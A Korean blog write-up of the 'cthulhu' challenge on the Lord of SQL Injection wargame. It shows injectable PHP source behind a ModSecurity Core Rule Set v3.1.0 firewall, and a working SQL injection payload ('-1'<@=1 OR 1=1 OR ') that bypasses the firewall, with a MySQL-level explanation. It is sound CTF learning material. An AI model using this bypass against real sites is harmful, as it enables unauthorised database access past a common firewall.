---
title: "[Lord of SQL Injection] LoS - cthulhu 문제풀이"
date: 2019-06-12
draft: false
category: [wargame]
subcategories: [lord-of-sql-injection]
tags: [Write-up, Lord of SQL Injection]
---

며칠 전, 2번에 걸쳐서 `LoS`의 문제가 업데이트 되었다.
이번이 랭킹에 이름을 올릴 수 있는 기회이길래 얼른 다 풀었다.
까먹기 전에 정리를 해 두려 한다.
첫 번째 문제 이름은 `cthulhu`이다.  

<!--more-->

코드는 다음과 같다.  

```php
modsec.rubiya.kr server is running ModSecurity Core Rule Set v3.1.0 with paranoia level 1(default).
It is the latest version now.(2019.05)
Can you bypass the WAF?
-------------------------------------------------------------
query : select id from prob_cthulhu where id='' and pw=''
-------------------------------------------------------------

<?php
  include "./welcome.php";
  include "./config.php";
  login_chk();
  $db = dbconnect();
  if(preg_match('/prob|_|\.|\(\)|admin/i', $_GET[id])) exit("No Hack ~_~");
  if(preg_match('/prob|_|\.|\(\)|admin/i', $_GET[pw])) exit("No Hack ~_~");
  $query = "select id from prob_cthulhu where id='{$_GET[id]}' and pw='{$_GET[pw]}'";
  echo "<hr>query : <strong>{$query}</strong><hr><br>";
  $result = @mysqli_fetch_array(mysqli_query($db,$query));
  if($result['id']) solve("cthulhu");
  highlight_file(__FILE__);
?>
```

문제의 소스코드 자체는 어렵지 않다.
그런데 `ModSecurity Core Rule Set v3.1.0` 이라는 방화벽이 추가되어 있다.
그래서 흔히 사용하는 방법으로 `SQL Injection`을 시도하면 자꾸 `Forbidden Error`가 나온다.
때문에 방화벽을 우회 해 문제를 풀어야 한다.
일단 나는 `ModSecurity Core Rule Set`이 뭔지를 몰라서 구글에 검색을 해 보았다.
그러다 아래와 같은 사이트를 찾았다.  

> [https://github.com/SpiderLabs/owasp-modsecurity-crs/issues/1181](https://github.com/SpiderLabs/owasp-modsecurity-crs/issues/1181)

여기에 적힌 방법 중 아래의 방법으로 문제를 풀 수 있었다.  

```plain
-1'<@=1 OR {a 1}=1 OR '
```

이 내용을 문제에 적용하면 다음과 같다.  

```plain
id=-1'<@=1 OR 1=1 OR '&pw=a
```

`{a 1}=1` 부분은 `1=1`로 변경했다.
해당 구문이 이해가 되지 않아서였는데, `{a 1}=1`은 테스트 해 보면 `true`가 되며, `select {a 1}`을 하면 `1`이 나온다.
아마도 아래의 이유 때문인 것 같은데, 정확하지 않아서 연구를 더 해봐야 알 것 같다.  

> [https://dev.mysql.com/doc/refman/5.7/en/expressions.html](https://dev.mysql.com/doc/refman/5.7/en/expressions.html)

```plain
{identifier expr} is ODBC escape syntax and is accepted for ODBC compatibility. The value is expr. The { and } curly braces in the syntax should be written literally; they are not metasyntax as used elsewhere in syntax descriptions.
```

어쨌든 해당 쿼리를 전달하면, 최종적으로 완성되는 쿼리는 다음과 같다.  

```mysql
select id from prob_cthulhu where id='-1'<@=1 OR 1=1 OR '' and pw='a'
```

`where` 절의 조건을 살펴보면 크게 `id='-1'<@=1`, `1=1`, `'' and pw='a'`로 나눌 수 있을 것이다.
먼저 첫 번째 조건인 `id='-1'<@1`의 경우, `'-1'<@1`이 `NULL`이 되면서 `id=NULL`로 만들어진다.
당연히 `id=NULL`인 행은 없기 때문에 다음 조건으로 넘어가게 된다.
이 때 두 번째 조건은 `1=1` 이므로 참이 되어 디비에서 값을 추출할 수 있게 된다.
문제에서는 `id`의 값이 무엇이든, `id`를 추출할 수 있기만 하면 되므로, 위의 쿼리를 통해 문제를 풀 수 있다.

```php
modsec.rubiya.kr server is running ModSecurity Core Rule Set v3.1.0 with paranoia level 1(default).
It is the latest version now.(2019.05)
Can you bypass the WAF?
---------------------------------------------------------------------------------------
query : select id from prob_cthulhu where id='-1'<@=1 OR 1=1 OR '' and pw='a'
---------------------------------------------------------------------------------------

CTHULHU Clear!
<?php
  include "./welcome.php";
  include "./config.php";
  login_chk();
  $db = dbconnect();
  if(preg_match('/prob|_|\.|\(\)|admin/i', $_GET[id])) exit("No Hack ~_~");
  if(preg_match('/prob|_|\.|\(\)|admin/i', $_GET[pw])) exit("No Hack ~_~");
  $query = "select id from prob_cthulhu where id='{$_GET[id]}' and pw='{$_GET[pw]}'";
  echo "<hr>query : <strong>{$query}</strong><hr><br>";
  $result = @mysqli_fetch_array(mysqli_query($db,$query));
  if($result['id']) solve("cthulhu");
  highlight_file(__FILE__);
?>
```
---

```plain
CTHULHU Clear!!
```